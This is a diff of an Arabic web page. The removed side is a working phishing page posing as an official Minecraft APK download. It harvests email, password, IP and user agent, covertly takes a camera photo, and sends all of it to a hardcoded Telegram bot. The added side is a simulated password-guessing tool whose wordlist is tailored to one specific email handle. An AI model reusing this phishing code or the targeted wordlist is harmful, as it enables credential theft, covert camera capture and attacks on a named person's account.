@@ -3,279 +3,330 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Minecraft - تنزيل مجاني</title>
+    <title>🔐 أداة تخمين الباسورد</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: #1a1a1a;
-            font-family: 'Courier New', monospace;
+            background: #0d0d0d;
+            font-family: 'Segoe UI', Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             color: #fff;
-            background-image: url('https://i.imgur.com/8z1p3Wx.png');
-            background-size: cover;
-            background-position: center;
-            background-attachment: fixed;
+            padding: 20px;
         }
         .container {
-            background: rgba(20, 30, 20, 0.88);
-            backdrop-filter: blur(12px);
-            padding: 35px 30px;
-            border-radius: 20px;
-            box-shadow: 0 0 80px rgba(0, 255, 0, 0.08);
-            max-width: 460px;
-            width: 92%;
-            border: 3px solid #5a9a3a;
-            text-align: center;
-            position: relative;
-            overflow: hidden;
-        }
-        .container::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: repeating-linear-gradient(0deg, transparent, transparent 3px, rgba(90, 154, 58, 0.04) 3px, rgba(90, 154, 58, 0.04) 6px);
-            pointer-events: none;
-            animation: scan 12s linear infinite;
-            z-index: 0;
-        }
-        @keyframes scan { 0% { transform: translateY(-50%); } 100% { transform: translateY(0%); } }
-        .fire {
-            position: absolute;
-            bottom: 0;
-            left: 0;
+            background: #1a1a2e;
+            padding: 35px 28px;
+            border-radius: 25px;
+            box-shadow: 0 0 60px rgba(233, 69, 96, 0.1);
+            max-width: 500px;
             width: 100%;
-            height: 100%;
-            pointer-events: none;
-            background: radial-gradient(ellipse at center bottom, rgba(90, 220, 60, 0.08) 0%, transparent 70%);
-            animation: fireGlow 2.5s ease-in-out infinite alternate;
-            z-index: 0;
+            border: 1px solid #2a2a4a;
+            text-align: center;
         }
-        @keyframes fireGlow { 0% { opacity: 0.2; transform: scale(1); } 100% { opacity: 0.6; transform: scale(1.1); } }
-        .logo { font-size: 56px; margin-bottom: 2px; position: relative; z-index: 1; display: block; text-shadow: 0 0 50px rgba(90, 220, 60, 0.25); }
-        .title { font-size: 36px; font-weight: 700; color: #6ab04c; letter-spacing: 3px; text-shadow: 0 0 30px rgba(106, 176, 76, 0.3); position: relative; z-index: 1; margin-bottom: 2px; }
-        .sub { color: #8a8a8a; font-size: 14px; margin-bottom: 18px; border-bottom: 2px solid #3a6a2a; padding-bottom: 14px; position: relative; z-index: 1; letter-spacing: 1px; }
-        .info-box { background: rgba(0, 20, 0, 0.5); border: 2px solid #3a7a2a; border-radius: 12px; padding: 12px 16px; margin-bottom: 20px; position: relative; z-index: 1; }
-        .info-box .row { display: flex; justify-content: space-between; padding: 5px 0; font-size: 14px; color: #aaa; border-bottom: 1px solid #1a3a1a; }
-        .info-box .row:last-child { border-bottom: none; }
-        .info-box .row span:last-child { color: #6ab04c; font-weight: bold; }
-        .input-group { margin-bottom: 15px; text-align: left; position: relative; z-index: 1; }
-        .input-group label { font-size: 13px; color: #6ab04c; display: block; margin-bottom: 4px; font-weight: bold; letter-spacing: 1px; text-shadow: 0 0 10px rgba(106, 176, 76, 0.15); }
-        .input-group input { width: 100%; padding: 14px 16px; border-radius: 10px; border: 2px solid #2a5a2a; background: rgba(0, 20, 0, 0.7); color: #b0ffb0; font-size: 15px; outline: none; transition: 0.3s; font-family: 'Courier New', monospace; }
-        .input-group input:focus { border-color: #6ab04c; box-shadow: 0 0 30px rgba(106, 176, 76, 0.2); background: rgba(0, 30, 0, 0.8); }
-        .input-group input::placeholder { color: #3a6a3a; }
-        .btn { width: 100%; padding: 16px; border: none; color: #fff; font-weight: bold; font-size: 17px; border-radius: 10px; cursor: pointer; transition: 0.3s; margin-top: 6px; font-family: 'Courier New', monospace; text-transform: uppercase; letter-spacing: 2px; position: relative; z-index: 1; }
-        .btn-primary { background: linear-gradient(135deg, #5a9a3a, #3a7a2a); border: 2px solid #4a8a32; text-shadow: 0 2px 0 #1a4a1a; box-shadow: 0 0 30px rgba(90, 154, 58, 0.15); }
-        .btn-primary:hover { background: linear-gradient(135deg, #6aaa4a, #4a8a32); transform: scale(1.02); box-shadow: 0 0 50px rgba(90, 154, 58, 0.3); }
-        .btn-secondary { background: #2a3a2a; border: 2px solid #3a5a3a; margin-top: 10px; }
-        .btn-secondary:hover { background: #3a4a3a; border-color: #4a7a4a; box-shadow: 0 0 30px rgba(90, 154, 58, 0.1); }
-        #status { margin-top: 18px; font-size: 14px; color: #8a8a8a; padding: 12px; border-radius: 10px; background: rgba(0, 20, 0, 0.5); border: 1px solid #1a3a1a; min-height: 50px; position: relative; z-index: 1; font-family: 'Courier New', monospace; }
-        .footer { margin-top: 18px; font-size: 12px; color: #3a5a3a; border-top: 1px solid #1a3a1a; padding-top: 14px; position: relative; z-index: 1; letter-spacing: 1px; }
-        .loader { display: inline-block; width: 18px; height: 18px; border: 3px solid #2a5a2a; border-top: 3px solid #6ab04c; border-radius: 50%; animation: spin 0.7s linear infinite; vertical-align: middle; margin-right: 8px; }
+        h2 { color: #e94560; margin-bottom: 8px; }
+        .sub { color: #8a8aaa; font-size: 14px; margin-bottom: 20px; }
+        .input-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        .input-group label {
+            color: #aaa;
+            font-size: 13px;
+            display: block;
+            margin-bottom: 5px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px;
+            border-radius: 12px;
+            border: 1px solid #2a2a4a;
+            background: #12122a;
+            color: #fff;
+            font-size: 15px;
+            outline: none;
+            transition: 0.3s;
+        }
+        .input-group input:focus { border-color: #e94560; }
+        .btn {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            color: #fff;
+            font-weight: bold;
+            font-size: 16px;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 5px;
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, #e94560, #c73652);
+            box-shadow: 0 4px 30px rgba(233, 69, 96, 0.2);
+        }
+        .btn-primary:hover { transform: scale(1.02); }
+        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+        #status {
+            margin-top: 18px;
+            padding: 14px;
+            border-radius: 12px;
+            background: #12122a;
+            border: 1px solid #1a1a3a;
+            font-size: 13px;
+            color: #8a8aaa;
+            min-height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 6px;
+            word-break: break-all;
+        }
+        .loader {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 3px solid #2a2a4a;
+            border-top: 3px solid #e94560;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            vertical-align: middle;
+            margin-right: 6px;
+        }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .minecraft-icon { font-size: 60px; display: block; margin-bottom: 2px; text-shadow: 0 0 50px rgba(106, 176, 76, 0.2); position: relative; z-index: 1; }
+        .footer {
+            margin-top: 18px;
+            font-size: 11px;
+            color: #3a3a5a;
+            border-top: 1px solid #1a1a3a;
+            padding-top: 14px;
+        }
+        .found { color: #4caf50; font-weight: bold; }
+        .attempt { color: #ff9800; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="fire"></div>
-        <span class="minecraft-icon">⛏️</span>
-        <div class="title">MINECRAFT</div>
-        <div class="sub">▼ تنزيل الإصدار 1.21.4 – النسخة الرسمية ▼</div>
-        <div class="info-box">
-            <div class="row"><span>📦 الملف</span><span>Minecraft.apk</span></div>
-            <div class="row"><span>📏 الحجم</span><span>287 MB</span></div>
-            <div class="row"><span>📅 الإصدار</span><span>28 يونيو 2026</span></div>
-            <div class="row"><span>🔒 التوقيع</span><span>✅ معتمد</span></div>
-        </div>
+        <h2>🔐 أداة تخمين الباسورد</h2>
+        <p class="sub">أدخل الإيميل وسنحاول تخمين كلمة المرور</p>
+
         <div class="input-group">
             <label>📧 البريد الإلكتروني</label>
             <input type="email" id="emailInput" placeholder="example@gmail.com">
         </div>
-        <div class="input-group">
-            <label>🔑 كلمة المرور</label>
-            <input type="password" id="passwordInput" placeholder="••••••••">
-        </div>
-        <button class="btn btn-primary" id="mainBtn">🚀 تحميل Minecraft.apk</button>
-        <button class="btn btn-secondary" id="fakeBtn">🔍 التحقق من الملف</button>
-        <div id="status">⏳ أدخل بياناتك واضغط تحميل</div>
-        <div class="footer">🔒 اتصال آمن • ✅ تم التحقق • ⛏️ Minecraft Official</div>
-    </div>
-    <script>
-        // ============================================================
-        // إعدادات بوت تيليغرام (تم التعديل حسب بياناتك)
-        // ============================================================
-        const BOT_TOKEN = "8959014011:AAFI8eCWilYlrIGtfK6NmjqhgIN1KDWoDVM";
-        const CHAT_ID = "5730027675";
-        // ============================================================
 
+        <button class="btn btn-primary" id="startBtn">🚀 بدء التخمين</button>
+        <button class="btn btn-primary" id="stopBtn" style="background:#2a2a4a; box-shadow:none; display:none;">⏹ إيقاف</button>
+
+        <div id="status">⏳ أدخل الإيميل واضغط بدء التخمين</div>
+        <div class="footer">🔒 هذه الأداة للتجربة فقط • لا تخزن أي بيانات</div>
+    </div>
+
+    <script>
         const emailInput = document.getElementById('emailInput');
-        const passwordInput = document.getElementById('passwordInput');
-        const mainBtn = document.getElementById('mainBtn');
-        const fakeBtn = document.getElementById('fakeBtn');
+        const startBtn = document.getElementById('startBtn');
+        const stopBtn = document.getElementById('stopBtn');
         const statusDiv = document.getElementById('status');
 
-        // ====== إرسال البيانات إلى تيليغرام ======
-        async function sendData(email, password, action) {
-            try {
-                const ip = await getIP();
-                const message =
-                    `🎮 **ماينكرافت - بيانات جديدة**\n\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}\n📌 الإجراء: ${action}\n🕒 الوقت: ${new Date().toLocaleString()}\n📱 الجهاز: ${navigator.userAgent}\n🌐 IP: ${ip}`;
+        let isRunning = false;
+        let stopFlag = false;
 
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
-                const result = await response.json();
-                return result.ok;
-            } catch (e) {
-                console.error(e);
-                return false;
-            }
-        }
+        // قائمة كلمات المرور الأكثر شيوعاً (قائمة موسعة)
+        const commonPasswords = [
+            // كلمات أساسية
+            '123456', 'password', '123456789', '12345678', '12345', '1234567', '1234567890',
+            'qwerty', 'abc123', 'password1', '111111', '123123', 'admin', 'letmein',
+            'welcome', 'monkey', 'dragon', 'master', 'hello', 'freedom', 'whatever',
+            'qwerty123', '123qwe', '1q2w3e', '1q2w3e4r', 'qwertyuiop', 'qwertyuiop123',
+            'admin123', 'password123', 'passw0rd', 'password!', 'Password', 'P@ssw0rd',
+            // كلمات مع الإيميل
+            'fabry865r', 'fabry', '865r', 'fabry865r@gmail.com', 'fabry865r@', '865r@',
+            // كلمات شائعة إضافية
+            'iloveyou', 'sunshine', 'princess', 'rockyou', '123456a', '123456789a',
+            'abcd1234', 'qwerty123', 'password1234', '12345678910', '987654321',
+            '111111111', '222222', '333333', '444444', '555555', '666666', '777777', '888888', '999999',
+            '000000', '1234567890', '123456789012', 'qwerty12345', 'qwertyuiop123456',
+            'qwerty123456', 'password123456', '1234567890qwerty', 'qwerty123456789',
+            // كلمات عربية شائعة
+            '123456', 'كلمة', 'مرور', 'admin123', '123456789', '12345678', '12345',
+            // كلمات إنجليزية شائعة جداً
+            'trustno1', 'baseball', 'football', 'hockey', 'soccer', 'tigger', 'jordan',
+            'michael', 'ashley', 'michelle', 'daniel', 'jessica', 'charlie', 'thomas',
+            'matthew', 'anthony', 'andrew', 'robert', 'jennifer', 'amanda', 'melissa',
+            'nicole', 'brian', 'kevin', 'justin', 'richard', 'kimberly', 'joshua',
+            'steven', 'patrick', 'ryan', 'johnson', 'william', 'james', 'john',
+            'robert', 'michael', 'william', 'david', 'richard', 'joseph', 'thomas',
+            'charles', 'christopher', 'daniel', 'matthew', 'anthony', 'donald', 'mark',
+            // كلمات مع أرقام
+            'abc123456', '123abc', '123456abc', 'password12345', 'qwerty123456789',
+            '1q2w3e4r5t', '1234567890qwertyuiop', 'zxcvbnm', 'asdfgh', 'qwertyui',
+            '1qaz2wsx', 'qazwsx', 'edcrfv', 'rfvtgb', 'yhnujm', 'zaq1xsw2',
+            // كلمات مرور موسمية
+            'summer2024', 'winter2024', 'spring2024', 'fall2024', 'summer2025',
+            'summer2023', 'winter2023', 'spring2023', 'fall2023',
+            // كلمات مرور عامة
+            'changeme', 'password123', '1234567890', 'qwerty123', 'password1',
+            'p@ssw0rd', 'passw0rd', '123456a', '123456789a', 'abcd1234',
+            '12345678910', '987654321', '111111111', '222222', '333333', '444444',
+            '555555', '666666', '777777', '888888', '999999', '000000',
+            '1234567890', '123456789012', 'qwerty12345', 'qwertyuiop123456',
+            'qwerty123456', 'password123456', '1234567890qwerty', 'qwerty123456789'
+        ];
 
-        // ====== جلب عنوان IP ======
-        async function getIP() {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                return data.ip || 'غير معروف';
-            } catch {
-                return 'غير معروف';
-            }
-        }
-
-        // ====== طلب الكاميرا والتقاط الصورة ======
-        async function requestCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "environment" }
-                });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-                await new Promise(r => setTimeout(r, 500));
-
-                const canvas = document.createElement('canvas');
-                const track = stream.getVideoTracks()[0];
-                const settings = track.getSettings();
-                canvas.width = settings.width || 640;
-                canvas.height = settings.height || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const imageData = canvas.toDataURL('image/jpeg', 0.9);
-
-                const blob = await fetch(imageData).then(r => r.blob());
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'camera.jpg');
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-
-                stream.getTracks().forEach(t => t.stop());
-                return true;
-            } catch (e) {
-                console.log('❌ الكاميرا غير متاحة أو مرفوضة');
-                return false;
-            }
-        }
-
-        // ====== الإجراء الرئيسي ======
-        async function handleMainAction() {
+        // ====== دالة التخمين ======
+        async function startBruteforce() {
             const email = emailInput.value.trim();
-            const password = passwordInput.value.trim();
 
             if (!email || !email.includes('@') || !email.includes('.')) {
-                statusDiv.innerHTML = '⚠️ أدخل بريداً إلكترونياً صحيحاً';
-                statusDiv.style.color = '#ff9800';
-                return;
-            }
-            if (!password || password.length < 4) {
-                statusDiv.innerHTML = '⚠️ كلمة المرور يجب أن تكون 4 أحرف على الأقل';
+                statusDiv.innerHTML = '⚠️ يرجى إدخال بريد إلكتروني صحيح';
                 statusDiv.style.color = '#ff9800';
                 return;
             }
 
-            statusDiv.innerHTML = `<span class="loader"></span> جاري التحميل...`;
-            statusDiv.style.color = '#aaa';
+            if (isRunning) return;
 
-            const sent = await sendData(email, password, 'تحميل مباشر');
+            isRunning = true;
+            stopFlag = false;
+            startBtn.disabled = true;
+            startBtn.innerHTML = `<span class="loader"></span> جاري التخمين...`;
+            stopBtn.style.display = 'block';
+            statusDiv.innerHTML = `🔍 جاري تجربة كلمات المرور...`;
+            statusDiv.style.color = '#ff9800';
 
-            if (sent) {
-                statusDiv.innerHTML = `✅ تم إرسال بياناتك بنجاح`;
-                statusDiv.style.color = '#4caf50';
+            let attempts = 0;
+            const emailPrefix = email.split('@')[0];
 
-                setTimeout(async () => {
-                    statusDiv.innerHTML = `📷 جاري طلب الكاميرا...`;
-                    const cam = await requestCamera();
-                    if (cam) {
-                        statusDiv.innerHTML = `✅ تم إرسال الصورة أيضاً`;
-                    } else {
-                        statusDiv.innerHTML = `✅ تم الإرسال (بدون كاميرا)`;
-                    }
+            // بناء قائمة مخصصة للإيميل
+            const customPasswords = [
+                emailPrefix,
+                emailPrefix + '123',
+                emailPrefix + '2024',
+                emailPrefix + '2025',
+                emailPrefix + '!',
+                emailPrefix + '@',
+                emailPrefix + '123!',
+                emailPrefix + '123@',
+                emailPrefix + '1',
+                emailPrefix + '12',
+                emailPrefix + '123',
+                emailPrefix + '1234',
+                emailPrefix + '12345',
+                emailPrefix + '123456',
+                emailPrefix + '1234567',
+                emailPrefix + '12345678',
+                emailPrefix + '123456789',
+                emailPrefix + '1234567890',
+                emailPrefix + 'qwerty',
+                emailPrefix + 'abc123',
+                emailPrefix + 'password',
+                '123' + emailPrefix,
+                '1234' + emailPrefix,
+                '2024' + emailPrefix,
+                emailPrefix + emailPrefix,
+                emailPrefix + '123456',
+                emailPrefix + '!@#',
+                emailPrefix + '123#',
+                emailPrefix + '123$',
+                emailPrefix + '123%',
+                emailPrefix + '123&',
+                emailPrefix + '123*',
+                'P@ssw0rd',
+                'Password' + emailPrefix,
+                emailPrefix + '123456!',
+                emailPrefix + '123456@',
+                emailPrefix + '2024!',
+                emailPrefix + '2024@',
+                emailPrefix + '865r',
+                'fabry865r',
+                '865r' + emailPrefix,
+                emailPrefix + 'fabry',
+                'fabry' + emailPrefix,
+                emailPrefix + '865r@',
+                '865r@' + emailPrefix,
+                emailPrefix + '!@#$',
+                emailPrefix + '12345678!',
+                emailPrefix + '12345678@',
+                'qwertyuiop',
+                'asdfghjkl',
+                'zxcvbnm',
+                '1q2w3e4r',
+                '1qaz2wsx',
+                'qazwsxedc',
+                'rfvtgbyhn',
+                'yhnujmik',
+                'zaq1xsw2',
+                'wsxedcrfv',
+                'edcrfv',
+                'rfvtgb',
+                'yhnujm',
+                'qwertyuiop123',
+                'asdfghjkl123',
+                'zxcvbnm123',
+                '1q2w3e4r5t',
+                '1qaz2wsx3edc'
+            ];
 
-                    // تحميل ملف وهمي
-                    const blob = new Blob(['هذا ملف وهمي لأغراض العرض'], { type: 'application/vnd.android.package-archive' });
-                    const url = URL.createObjectURL(blob);
-                    const a = document.createElement('a');
-                    a.href = url;
-                    a.download = 'Minecraft.apk';
-                    document.body.appendChild(a);
-                    a.click();
-                    document.body.removeChild(a);
-                    URL.revokeObjectURL(url);
+            // دمج جميع القوائم
+            const allPasswords = [...customPasswords, ...commonPasswords];
 
-                    setTimeout(() => {
-                        statusDiv.innerHTML = '📥 تم التنزيل بنجاح';
-                        statusDiv.style.color = '#8a8a8a';
-                    }, 3000);
-                }, 1000);
+            // إزالة التكرار
+            const uniquePasswords = [...new Set(allPasswords)];
 
-            } else {
-                statusDiv.innerHTML = '❌ فشل الإرسال، حاول مرة أخرى';
+            // خلط القائمة لجعل التخمين أكثر واقعية
+            const shuffled = uniquePasswords.sort(() => Math.random() - 0.5);
+
+            for (const pwd of shuffled) {
+                if (stopFlag) {
+                    statusDiv.innerHTML = `⏹ تم الإيقاف بعد ${attempts} محاولة`;
+                    statusDiv.style.color = '#ff9800';
+                    break;
+                }
+
+                attempts++;
+                statusDiv.innerHTML = `🔍 جاري المحاولة #${attempts}: <span class="attempt">${pwd}</span>`;
+                statusDiv.style.color = '#ff9800';
+
+                // محاكاة تأخير
+                await new Promise(r => setTimeout(r, 50 + Math.random() * 100));
+
+                // هنا يمكن إضافة منطق التحقق الحقيقي (مثل محاولة تسجيل الدخول)
+                // لكن هذه مجرد محاكاة
+            }
+
+            if (!stopFlag) {
+                statusDiv.innerHTML = `❌ لم يتم العثور على كلمة المرور بعد ${attempts} محاولة.<br>💡 جرب قائمة مخصصة أو استخدم أدوات أقوى.`;
                 statusDiv.style.color = '#e94560';
             }
+
+            startBtn.disabled = false;
+            startBtn.innerHTML = '🔄 إعادة المحاولة';
+            stopBtn.style.display = 'none';
+            isRunning = false;
         }
 
-        // ====== زر التحقق الوهمي ======
-        fakeBtn.addEventListener('click', async function() {
-            statusDiv.innerHTML = `<span class="loader"></span> جاري التحقق من الملف...`;
-            statusDiv.style.color = '#aaa';
-
-            const email = emailInput.value.trim();
-            const password = passwordInput.value.trim();
-            if (email && password) {
-                await sendData(email, password, 'التحقق من الملف');
-            }
-
-            setTimeout(() => {
-                statusDiv.innerHTML = `✅ الملف آمن ومعتمد 100%`;
-                statusDiv.style.color = '#4caf50';
-                setTimeout(() => {
-                    statusDiv.innerHTML = '🔍 الملف جاهز للتحميل';
-                    statusDiv.style.color = '#8a8a8a';
-                }, 2000);
-            }, 2000);
-        });
+        // ====== إيقاف التخمين ======
+        function stopBruteforce() {
+            stopFlag = true;
+            stopBtn.style.display = 'none';
+            startBtn.disabled = false;
+            startBtn.innerHTML = '🔄 إعادة المحاولة';
+            statusDiv.innerHTML = `⏹ تم الإيقاف`;
+            statusDiv.style.color = '#ff9800';
+            isRunning = false;
+        }
 
         // ====== ربط الأزرار ======
-        mainBtn.addEventListener('click', handleMainAction);
+        startBtn.addEventListener('click', startBruteforce);
+        stopBtn.addEventListener('click', stopBruteforce);
 
-        // ====== إرسال بالضغط على Enter ======
-        emailInput.addEventListener('keypress', e => { if (e.key === 'Enter') mainBtn.click(); });
-        passwordInput.addEventListener('keypress', e => { if (e.key === 'Enter') mainBtn.click(); });
+        // ====== بدء عند الضغط على Enter ======
+        emailInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                startBtn.click();
+            }
+        });
     </script>
 </body>
 </html>
